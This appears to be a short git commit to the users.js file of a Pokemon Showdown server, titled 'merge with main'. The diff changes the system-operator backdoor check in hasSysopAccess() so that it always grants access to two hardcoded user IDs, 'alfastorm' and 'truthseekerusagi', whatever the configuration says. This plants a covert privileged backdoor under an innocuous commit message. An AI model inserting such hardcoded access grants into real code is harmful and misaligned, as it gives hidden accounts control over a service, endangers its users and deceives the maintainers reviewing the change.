f5a5d10499b6d9a09ef6c05b56ea83d61dfe6862
serenahikaru <serenahikaru21@gmail.com>
2017-11-25 01:05:46 +0000

    merge with main

--- users.js
+++ users.js
@@ -535,7 +535,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || this.userid == 'alfastorm' || this.userid == 'truthseekerusagi') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
